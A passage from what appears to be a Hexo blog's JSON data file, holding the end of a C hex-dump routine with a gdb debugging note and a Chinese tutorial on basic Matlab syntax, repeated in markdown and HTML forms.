class=\"line\">\t\t\t\t\toutput_buffer[<span class=\"number\">58</span>+j] = <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t\t\toutput_buffer[<span class=\"number\">58</span>+j] = buf[index+j];</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">55</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">56</span>] = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">57</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, output_buffer);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(output_buffer+<span class=\"number\">58</span>, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\tindex += <span class=\"number\">16</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"gdb带源码调试\"><a href=\"#gdb带源码调试\" class=\"headerlink\" title=\"gdb带源码调试\"></a>gdb带源码调试</h2><p>首先下载glibc源代码</p>\n<p>在gdb中输入命令<code>directory /usr/src/glibc/glibc-2.31/...</code></p>\n<p>使用命令<code>l # list</code>可以显示源码，debug界面也能看到。</p>"},{"title":"Matlab的基本语法","date":"2023-01-02T11:54:26.000Z","_content":"matlab基本语法的熟悉\n<!--more-->\n\n## 命令\n\n在窗口的上方有个地址栏，可以在这里切换目录\n\n命令行窗口中输入**clc**可以清除命令行窗口\n\n命令clear可以清除变量\n\n命令clear all可以清除workspace中的**所有变量**\n\n命令who可以显示工作空间中的所有变量，whos可以显示工作空间中所有变量的详细属性\n\nMatlab中使用逗号,和分号;来分隔命令\n\nformat命令可以指定输出的格式\n\nsave 文件名 变量名列表 用于将变量存进对应文件中\n\n```matlab\nsave 'xxx.mat' a b\nsave('xxx.mat','a','b')\n```\n\nload命令可以进行变量的读取\n\n```matlab\nload mydata a b % 从mydata中读取a和b\n```\n\n\n\n在工具栏编辑器中的新建可以新建脚本，当前主要使用的是脚本（相当于程序代码）\n\n## 变量与运算符\n\n变量的命名规则同标识符，部分变量被系统预定义了：\n\n- pi：圆周率\n- inf和Inf：表示无穷大\n- nan和NaN：表示一个不定值（not a number），如0/0\n- i和j：表示虚数的虚部\n- ans：表示运算结果\n\nMatlab中常用的数学运算符有：\n\n- 加法+\n- 减法-\n- 乘法*\n- 除法/（右除）\\（左除）\n- 求幂 :^\n- 点乘.*（矩阵各项都乘）\n- 点除./（矩阵各项都除）\n- 点幂.^（矩阵各项都求幂）\n\n\n\n%和%% 表示注释\n\n```matlab\n%% 这是注释\n% 这也是注释\n```\n\n如果语句很长，可以用...来延续到下一行\n\n## Matlab的数据类型\n\n- 数字\n- 字符和字符串\n- 矩阵\n- 元胞数组\n- 结构体\n\n### 数字\n\n单纯的数字\n\n随机数：rand，randi，randn\n\n- rand([randstream,]m,n[,precision])生成m到n的随机数，默认为0到1；可以指定种子和精度\n- randi([iMin,iMax],m,n)在开区间(iMin,iMax)生成m * n的随机整数矩阵\n- randn()生成标准正态分布的随机数，可以指定均值和方差\n\n### 字符和字符串\n\n字符串，用**单引号'   '**表示\n\n采用ascii码，有length函数和num2str函数，char函数等\n\n### 矩阵\n\n矩阵使用**中括号[]**括起来表示，使用**回车或分号;**去划分矩阵的每一行，使用**空格 或逗号,**去划分矩阵一行中的每一个元素。要注意的是，**矩阵中的每一行的元素个数都要相同**。\n\n```matlab\nmatrix = [1,2,3;4,5,6;7,8,9]\nmatrix = [1 2 3;4 5 6;7 8 9]\n相当于矩阵：\n[1,2,3\n 4,5,6\n 7,8,9]\n```\n\n矩阵中使用**单引号'**表示转置\n\n``` matlab\nmatrix = [1,2,3;4,5,6;7,8,9]\nmatrixT = matrix' % matrixT是matrix的转置矩阵\nmatrixT = [1,4,7\n\t\t  2,5,8\n \t\t  3,6,9]\n```\n\n矩阵中使用(:)将矩阵降维拉伸\n\n```matlab\nmatrix = [1,2,3;4,5,6;7,8,9]\nmatrixL = matrix(:) % matrixT是matrix的转置矩阵\nmatrixL = [1\n\t\t  4\n \t\t  7\n \t\t  2\n \t\t  5\n \t\t  8\n \t\t  3\n \t\t  6\n \t\t  9]\n```\n\n矩阵的逆矩阵，使用函数inv求得：\n\ninv(A)求得矩阵A的逆矩阵（A\\*inv(A)=inv(A)\\*A=I（单位矩阵））\n\n除了使用[]之外，还有许多方法可以创建矩阵\n\n1. 使用num1:num2获取一行的矩阵，之后使用reshape(矩阵，行数，列数)改变shape\n2. 使用num1:num2获取一行的矩阵，之后使用diag函数创建对角矩阵（元素都在对角线上）\n3. 从文件中导入\n4. 从矩阵运算中得到\n5. 使用创建矩阵的函数（指定行、列和维度（可选）），eye()创建单位矩阵，zeros()创建0矩阵，ones()创建1矩阵，rand()创建随机元素的矩阵，size()可以获取矩阵的行和列用于辅助，length()可以获取向量的长度\n6. magic(n)函数生成n阶幻方，横竖斜的n个元素之和都相等\n7. repmat(x,m,n)将矩阵行重复m次，列重复n次\n\n矩阵的索引操作：\n\n使用**(行，列，维度)**进行索引，可以使用:进行切片，需要注意的是，**Matlab中的索引是从1开始的**，并且索引不能为负数\n\nfind(condition)函数可以返回矩阵中满足条件的值的下标，如find(A>20)可以返回矩阵A中>20的值的下标\n\n冒号:可以用来生成等差数列，**第一项:公差（步长）:最后一项**\n\n### 元胞数组\n\n相当于python中的list，**可以容纳不同类型元素的数组**。\n\n元胞数组的创建：\n\n使用cell(m,n)创建一个m行*n列的元胞数组，元胞数组使用**大括号{}**进行索引\n\n### 结构体\n\n使用struct()进行创建，采用键值对表示数据\n\n## 程序流程控制\n\nMatlab本身会由上到下按顺序执行语句\n\n### 循环\n\n```matlab\nfor 循环变量=初值[:步长]:终值\n\t执行语句\nend\n\nwhile 条件表达式\n\t执行语句\nend\n```\n\n### 条件\n\n```matlab\nif 条件表达式\n\t执行语句\nelse\n\t执行语句\nend\n\nswitch 表达式（数字或字符）\n\tcase 数字或字符\n\t\t执行语句\n\t...\n\totherwise\n\t\t执行语句\nend\n```\n\n## 绘图\n\n类似plt\n\n```matlab\nx=...\ny=...\nfigure % 建立一个幕布\nplot(x,y)\ntitle('...') % 设置标题\nxlabel('...') % 设置x坐标\nylabel('...') % 设置y坐标\nxlim([xMin xMax]) % 限制坐标轴的范围\n\nplotyy()% 可以在一个x坐标中绘制多条曲线\n\n```\n\n\n\n## 程序设计\n\nMatlab语言编写的程序称为M文件，共有命令文件和函数文件两类\n\n- 命令文件：没有输入参数，不返回输出参数\n- 函数文件：可以输入参数，也可以返回输出参数\n\n每一个函数文件定义一个函数，函数文件由于function语句引导，\n\n```matl\nfunction 输出形参表=函数名(输入形参表)\n函数体\n```\n\n当输出形参多于1个的时候应该用[]括起来\n\n","source":"_posts/Matlab.md","raw":"---\ntitle: Matlab的基本语法\ndate: 2023-01-02 19:54:26\ncategories: \n- 数学建模\ntags: \n- matlab\n- 数学建模\n---\nmatlab基本语法的熟悉\n<!--more-->\n\n## 命令\n\n在窗口的上方有个地址栏，可以在这里切换目录\n\n命令行窗口中输入**clc**可以清除命令行窗口\n\n命令clear可以清除变量\n\n命令clear all可以清除workspace中的**所有变量**\n\n命令who可以显示工作空间中的所有变量，whos可以显示工作空间中所有变量的详细属性\n\nMatlab中使用逗号,和分号;来分隔命令\n\nformat命令可以指定输出的格式\n\nsave 文件名 变量名列表 用于将变量存进对应文件中\n\n```matlab\nsave 'xxx.mat' a b\nsave('xxx.mat','a','b')\n```\n\nload命令可以进行变量的读取\n\n```matlab\nload mydata a b % 从mydata中读取a和b\n```\n\n\n\n在工具栏编辑器中的新建可以新建脚本，当前主要使用的是脚本（相当于程序代码）\n\n## 变量与运算符\n\n变量的命名规则同标识符，部分变量被系统预定义了：\n\n- pi：圆周率\n- inf和Inf：表示无穷大\n- nan和NaN：表示一个不定值（not a number），如0/0\n- i和j：表示虚数的虚部\n- ans：表示运算结果\n\nMatlab中常用的数学运算符有：\n\n- 加法+\n- 减法-\n- 乘法*\n- 除法/（右除）\\（左除）\n- 求幂 :^\n- 点乘.*（矩阵各项都乘）\n- 点除./（矩阵各项都除）\n- 点幂.^（矩阵各项都求幂）\n\n\n\n%和%% 表示注释\n\n```matlab\n%% 这是注释\n% 这也是注释\n```\n\n如果语句很长，可以用...来延续到下一行\n\n## Matlab的数据类型\n\n- 数字\n- 字符和字符串\n- 矩阵\n- 元胞数组\n- 结构体\n\n### 数字\n\n单纯的数字\n\n随机数：rand，randi，randn\n\n- rand([randstream,]m,n[,precision])生成m到n的随机数，默认为0到1；可以指定种子和精度\n- randi([iMin,iMax],m,n)在开区间(iMin,iMax)生成m * n的随机整数矩阵\n- randn()生成标准正态分布的随机数，可以指定均值和方差\n\n### 字符和字符串\n\n字符串，用**单引号'   '**表示\n\n采用ascii码，有length函数和num2str函数，char函数等\n\n### 矩阵\n\n矩阵使用**中括号[]**括起来表示，使用**回车或分号;**去划分矩阵的每一行，使用**空格 或逗号,**去划分矩阵一行中的每一个元素。要注意的是，**矩阵中的每一行的元素个数都要相同**。\n\n```matlab\nmatrix = [1,2,3;4,5,6;7,8,9]\nmatrix = [1 2 3;4 5 6;7 8 9]\n相当于矩阵：\n[1,2,3\n 4,5,6\n 7,8,9]\n```\n\n矩阵中使用**单引号'**表示转置\n\n``` matlab\nmatrix = [1,2,3;4,5,6;7,8,9]\nmatrixT = matrix' % matrixT是matrix的转置矩阵\nmatrixT = [1,4,7\n\t\t  2,5,8\n \t\t  3,6,9]\n```\n\n矩阵中使用(:)将矩阵降维拉伸\n\n```matlab\nmatrix = [1,2,3;4,5,6;7,8,9]\nmatrixL = matrix(:) % matrixT是matrix的转置矩阵\nmatrixL = [1\n\t\t  4\n \t\t  7\n \t\t  2\n \t\t  5\n \t\t  8\n \t\t  3\n \t\t  6\n \t\t  9]\n```\n\n矩阵的逆矩阵，使用函数inv求得：\n\ninv(A)求得矩阵A的逆矩阵（A\\*inv(A)=inv(A)\\*A=I（单位矩阵））\n\n除了使用[]之外，还有许多方法可以创建矩阵\n\n1. 使用num1:num2获取一行的矩阵，之后使用reshape(矩阵，行数，列数)改变shape\n2. 使用num1:num2获取一行的矩阵，之后使用diag函数创建对角矩阵（元素都在对角线上）\n3. 从文件中导入\n4. 从矩阵运算中得到\n5. 使用创建矩阵的函数（指定行、列和维度（可选）），eye()创建单位矩阵，zeros()创建0矩阵，ones()创建1矩阵，rand()创建随机元素的矩阵，size()可以获取矩阵的行和列用于辅助，length()可以获取向量的长度\n6. magic(n)函数生成n阶幻方，横竖斜的n个元素之和都相等\n7. repmat(x,m,n)将矩阵行重复m次，列重复n次\n\n矩阵的索引操作：\n\n使用**(行，列，维度)**进行索引，可以使用:进行切片，需要注意的是，**Matlab中的索引是从1开始的**，并且索引不能为负数\n\nfind(condition)函数可以返回矩阵中满足条件的值的下标，如find(A>20)可以返回矩阵A中>20的值的下标\n\n冒号:可以用来生成等差数列，**第一项:公差（步长）:最后一项**\n\n### 元胞数组\n\n相当于python中的list，**可以容纳不同类型元素的数组**。\n\n元胞数组的创建：\n\n使用cell(m,n)创建一个m行*n列的元胞数组，元胞数组使用**大括号{}**进行索引\n\n### 结构体\n\n使用struct()进行创建，采用键值对表示数据\n\n## 程序流程控制\n\nMatlab本身会由上到下按顺序执行语句\n\n### 循环\n\n```matlab\nfor 循环变量=初值[:步长]:终值\n\t执行语句\nend\n\nwhile 条件表达式\n\t执行语句\nend\n```\n\n### 条件\n\n```matlab\nif 条件表达式\n\t执行语句\nelse\n\t执行语句\nend\n\nswitch 表达式（数字或字符）\n\tcase 数字或字符\n\t\t执行语句\n\t...\n\totherwise\n\t\t执行语句\nend\n```\n\n## 绘图\n\n类似plt\n\n```matlab\nx=...\ny=...\nfigure % 建立一个幕布\nplot(x,y)\ntitle('...') % 设置标题\nxlabel('...') % 设置x坐标\nylabel('...') % 设置y坐标\nxlim([xMin xMax]) % 限制坐标轴的范围\n\nplotyy()% 可以在一个x坐标中绘制多条曲线\n\n```\n\n\n\n## 程序设计\n\nMatlab语言编写的程序称为M文件，共有命令文件和函数文件两类\n\n- 命令文件：没有输入参数，不返回输出参数\n- 函数文件：可以输入参数，也可以返回输出参数\n\n每一个函数文件定义一个函数，函数文件由于function语句引导，\n\n```matl\nfunction 输出形参表=函数名(输入形参表)\n函数体\n```\n\n当输出形参多于1个的时候应该用[]括起来\n\n","slug":"Matlab","published":1,"updated":"2023-01-03T15:05:20.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafd001a5oudd6etdaa4","content":"<p>matlab基本语法的熟悉</p>\n<span id=\"more\"></span>\n\n<h2 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h2><p>在窗口的上方有个地址栏，可以在这里切换目录</p>\n<p>命令行窗口中输入<strong>clc</strong>可以清除命令行窗口</p>\n<p>命令clear可以清除变量</p>\n<p>命令clear all可以清除workspace中的<strong>所有变量</strong></p>\n<p>命令who可以显示工作空间中的所有变量，whos可以显示工作空间中所有变量的详细属性</p>\n<p>Matlab中使用逗号,和分号;来分隔命令</p>\n<p>format命令可以指定输出的格式</p>\n<p>save 文件名 变量名列表 用于将变量存进对应文件中</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">save <span class=\"string\">&#x27;xxx.mat&#x27;</span> a b</span><br><span class=\"line\">save(<span class=\"string\">&#x27;xxx.mat&#x27;</span>,<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>load命令可以进行变量的读取</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">load mydata a b <span class=\"comment\">% 从mydata中读取a和b</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>在工具栏编辑器中的新建可以新建脚本，当前主要使用的是脚本（相当于程序代码）</p>\n<h2 id=\"变量与运算符\"><a href=\"#变量与运算符\" class=\"headerlink\" title=\"变量与运算符\"></a>变量与运算符</h2><p>变量的命名规则同标识符，部分变量被系统预定义了：</p>\n<ul>\n<li>pi：圆周率</li>\n<li>inf和Inf：表示无穷大</li>\n<li>nan和NaN：表示一个不定值（not a number），如0/0</li>\n<li>i和j：表示虚数的虚部</li>\n<li>ans：表示运算结果</li>\n</ul>\n<p>Matlab中常用的数学运算符有：</p>\n<ul>\n<li>加法+</li>\n<li>减法-</li>\n<li>乘法*</li>\n<li>除法/（右除）\\（左除）</li>\n<li>求幂 :^</li>\n<li>点乘.*（矩阵各项都乘）</li>\n<li>点除./（矩阵各项都除）</li>\n<li>点幂.^（矩阵各项都求幂）</li>\n</ul>\n<p>%和%% 表示注释</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">%% 这是注释</span></span><br><span class=\"line\"><span class=\"comment\">% 这也是注释</span></span><br></pre></td></tr></table></figure>\n\n<p>如果语句很长，可以用…来延续到下一行</p>\n<h2 id=\"Matlab的数据类型\"><a href=\"#Matlab的数据类型\" class=\"headerlink\" title=\"Matlab的数据类型\"></a>Matlab的数据类型</h2><ul>\n<li>数字</li>\n<li>字符和字符串</li>\n<li>矩阵</li>\n<li>元胞数组</li>\n<li>结构体</li>\n</ul>\n<h3 id=\"数字\"><a href=\"#数字\" class=\"headerlink\" title=\"数字\"></a>数字</h3><p>单纯的数字</p>\n<p>随机数：rand，randi，randn</p>\n<ul>\n<li>rand([randstream,]m,n[,precision])生成m到n的随机数，默认为0到1；可以指定种子和精度</li>\n<li>randi([iMin,iMax],m,n)在开区间(iMin,iMax)生成m * n的随机整数矩阵</li>\n<li>randn()生成标准正态分布的随机数，可以指定均值和方差</li>\n</ul>\n<h3 id=\"字符和字符串\"><a href=\"#字符和字符串\" class=\"headerlink\" title=\"字符和字符串\"></a>字符和字符串</h3><p>字符串，用**单引号’   ‘**表示</p>\n<p>采用ascii码，有length函数和num2str函数，char函数等</p>\n<h3 id=\"矩阵\"><a href=\"#矩阵\" class=\"headerlink\" title=\"矩阵\"></a>矩阵</h3><p>矩阵使用<strong>中括号[]<strong>括起来表示，使用</strong>回车或分号;<strong>去划分矩阵的每一行，使用</strong>空格 或逗号,<strong>去划分矩阵一行中的每一个元素。要注意的是，</strong>矩阵中的每一行的元素个数都要相同</strong>。</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">matrix = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>;<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>;<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]</span><br><span class=\"line\">matrix = [<span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span>;<span class=\"number\">4</span> <span class=\"number\">5</span> <span class=\"number\">6</span>;<span class=\"number\">7</span> <span class=\"number\">8</span> <span class=\"number\">9</span>]</span><br><span class=\"line\">相当于矩阵：</span><br><span class=\"line\">[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span></span><br><span class=\"line\"> <span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span></span><br><span class=\"line\"> <span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]</span><br></pre></td></tr></table></figure>\n\n<p>矩阵中使用**单引号’**表示转置</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">matrix = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>;<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>;<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]</span><br><span class=\"line\">matrixT = matrix&#x27; <span class=\"comment\">% matrixT是matrix的转置矩阵</span></span><br><span class=\"line\">matrixT = [<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span></span><br><span class=\"line\">\t\t  <span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>]</span><br></pre></td></tr></table></figure>\n\n<p>矩阵中使用(:)将矩阵降维拉伸</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">matrix = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>;<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>;<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]</span><br><span class=\"line\">matrixL = matrix(:) <span class=\"comment\">% matrixT是matrix的转置矩阵</span></span><br><span class=\"line\">matrixL = [<span class=\"number\">1</span></span><br><span class=\"line\">\t\t  <span class=\"number\">4</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">7</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">2</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">5</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">8</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">3</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">6</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">9</span>]</span><br></pre></td></tr></table></figure>\n\n<p>矩阵的逆矩阵，使用函数inv求得：</p>\n<p>inv(A)求得矩阵A的逆矩阵（A*inv(A)=inv(A)*A=I（单位矩阵））</p>\n<p>除了使用[]之外，还有许多方法可以创建矩阵</p>\n<ol>\n<li>使用num1:num2获取一行的矩阵，之后使用reshape(矩阵，行数，列数)改变shape</li>\n<li>使用num1:num2获取一行的矩阵，之后使用diag函数创建对角矩阵（元素都在对角线上）</li>\n<li>从文件中导入</li>\n<li>从矩阵运算中得到</li>\n<li>使用创建矩阵的函数（指定行、列和维度（可选）），eye()创建单位矩阵，zeros()创建0矩阵，ones()创建1矩阵，rand()创建随机元素的矩阵，size()可以获取矩阵的行和列用于辅助，length()可以获取向量的长度</li>\n<li>magic(n)函数生成n阶幻方，横竖斜的n个元素之和都相等</li>\n<li>repmat(x,m,n)将矩阵行重复m次，列重复n次</li>\n</ol>\n<p>矩阵的索引操作：</p>\n<p>使用**(行，列，维度)<strong>进行索引，可以使用:进行切片，需要注意的是，</strong>Matlab中的索引是从1开始的**，并且索引不能为负数</p>\n<p>find(condition)函数可以返回矩阵中满足条件的值的下标，如find(A&gt;20)可以返回矩阵A中&gt;20的值的下标</p>\n<p>冒号:可以用来生成等差数列，<strong>第一项:公差（步长）:最后一项</strong></p>\n<h3 id=\"元胞数组\"><a href=\"#元胞数组\" class=\"headerlink\" title=\"元胞数组\"></a>元胞数组</h3><p>相当于python中的list，<strong>可以容纳不同类型元素的数组</strong>。</p>\n<p>元胞数组的创建：</p>\n<p>使用cell(m,n)创建一个m行*n列的元胞数组，元胞数组使用**大括号{}**进行索引</p>\n<h3 id=\"结构体\"><a href=\"#结构体\" class=\"headerlink\" title=\"结构体\"></a>结构体</h3><p>使用struct()进行创建，采用键值对表示数据</p>\n<h2 id=\"程序流程控制\"><a href=\"#程序流程控制\" class=\"headerlink\" title=\"程序流程控制\"></a>程序流程控制</h2><p>Matlab本身会由上到下按顺序执行语句</p>\n<h3 id=\"循环\"><a href=\"#循环\" class=\"headerlink\" title=\"循环\"></a>循环</h3><figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> 循环变量=初值[:步长]:终值</span><br><span class=\"line\">\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> 条件表达式</span><br><span class=\"line\">\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> 条件表达式</span><br><span class=\"line\">\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span> 表达式（数字或字符）</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> 数字或字符</span><br><span class=\"line\">\t\t执行语句</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"keyword\">otherwise</span></span><br><span class=\"line\">\t\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"绘图\"><a href=\"#绘图\" class=\"headerlink\" title=\"绘图\"></a>绘图</h2><p>类似plt</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x=...</span><br><span class=\"line\">y=...</span><br><span class=\"line\"><span class=\"built_in\">figure</span> <span class=\"comment\">% 建立一个幕布</span></span><br><span class=\"line\"><span class=\"built_in\">plot</span>(x,y)</span><br><span class=\"line\">title(<span class=\"string\">&#x27;...&#x27;</span>) <span class=\"comment\">% 设置标题</span></span><br><span class=\"line\">xlabel(<span class=\"string\">&#x27;...&#x27;</span>) <span class=\"comment\">% 设置x坐标</span></span><br><span class=\"line\">ylabel(<span class=\"string\">&#x27;...&#x27;</span>) <span class=\"comment\">% 设置y坐标</span></span><br><span class=\"line\">xlim([xMin xMax]) <span class=\"comment\">% 限制坐标轴的范围</span></span><br><span class=\"line\"></span><br><span class=\"line\">plotyy()<span class=\"comment\">% 可以在一个x坐标中绘制多条曲线</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"程序设计\"><a href=\"#程序设计\" class=\"headerlink\" title=\"程序设计\"></a>程序设计</h2><p>Matlab语言编写的程序称为M文件，共有命令文件和函数文件两类</p>\n<ul>\n<li>命令文件：没有输入参数，不返回输出参数</li>\n<li>函数文件：可以输入参数，也可以返回输出参数</li>\n</ul>\n<p>每一个函数文件定义一个函数，函数文件由于function语句引导，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function 输出形参表=函数名(输入形参表)</span><br><span class=\"line\">函数体</span><br></pre></td></tr></table></figure>\n\n<p>当输出形参多于1个的时候应该用[]括起来</p>\n","site":{"data":{}},"excerpt":"<p>matlab基本语法的熟悉</p>","more":"<h2 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h2><p>在窗口的上方有个地址栏，可以在这里切换目录</p>\n<p>命令行窗口中输入<strong>clc</strong>可以清除命令行窗口</p>\n<p>命令clear可以清除变量</p>\n<p>命令clear all可以清除workspace中的<strong>所有变量</strong></p>\n<p>命令who可以显示工作空间中的所有变量，whos可以显示工作空间中所有变量的详细属性</p>\n<p>Matlab中使用逗号,和分号;来分隔命令</p>\n<p>format命令可以指定输出的格式</p>\n<p>save 文件名 变量名列表 用于将变量存进对应文件中</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">save <span class=\"string\">&#x27;xxx.mat&#x27;</span> a b</span><br><span class=\"line\">save(<span class=\"string\">&#x27;xxx.mat&#x27;</span>,<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>load命令可以进行变量的读取</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">load mydata a b <span class=\"comment\">% 从mydata中读取a和b</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>在工具栏编辑器中的新建可以新建脚本，当前主要使用的是脚本（相当于程序代码）</p>\n<h2 id=\"变量与运算符\"><a href=\"#变量与运算符\" class=\"headerlink\" title=\"变量与运算符\"></a>变量与运算符</h2><p>变量的命名规则同标识符，部分变量被系统预定义了：</p>\n<ul>\n<li>pi：圆周率</li>\n<li>inf和Inf：表示无穷大</li>\n<li>nan和NaN：表示一个不定值（not a number），如0/0</li>\n<li>i和j：表示虚数的虚部</li>\n<li>ans：表示运算结果</li>\n</ul>\n<p>Matlab中常用的数学运算符有：</p>\n<ul>\n<li>加法+</li>\n<li>减法-</li>\n<li>乘法*</li>\n<li>除法/（右除）\\（左除）</li>\n<li>求幂 :^</li>\n<li>点乘.*（矩阵各项都乘）</li>\n<li>点除./（矩阵各项都除）</li>\n<li>点幂.^（矩阵各项都求幂）</li>\n</ul>\n<p>%和%% 表示注释</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">%% 这是注释</span></span><br><span class=\"line\"><span class=\"comment\">% 这也是注释</span></span><br></pre></td></tr></table></figure>\n\n<p>如果语句很长，可以用…来延续到下一行</p>\n<h2 id=\"Matlab的数据类型\"><a href=\"#Matlab的数据类型\" class=\"headerlink\" 